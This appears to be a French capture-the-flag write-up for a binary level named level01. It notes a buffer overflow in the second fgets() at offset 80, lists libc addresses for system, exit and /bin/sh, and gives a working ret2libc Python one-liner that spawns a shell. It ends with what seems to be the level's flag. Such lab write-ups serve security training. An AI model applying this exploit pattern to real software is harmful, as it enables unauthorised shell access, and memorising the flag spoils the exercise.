Username attendu: dat_wil
Pas de segfault possible dans le premier fgets().

Mot de passe attendu: admin
Mais dans tous les cas le programme nous dis non, il n'y a en realité aucune condition de "reussite".
Segfault possible dans le deuxieme fgets().

1er buffer: 0x804a040
2nd buffer: 0xffffd6bc

Segfault avec offset 80, modification du saved-eip possible


libc start: 0xf7e2c000
system: 0xf7e6aed0
exit: 0xf7e5eb70
/bin/sh: 0xf7f897ec


(python -c 'print "dat_wil"'; python -c 'print "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level01

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv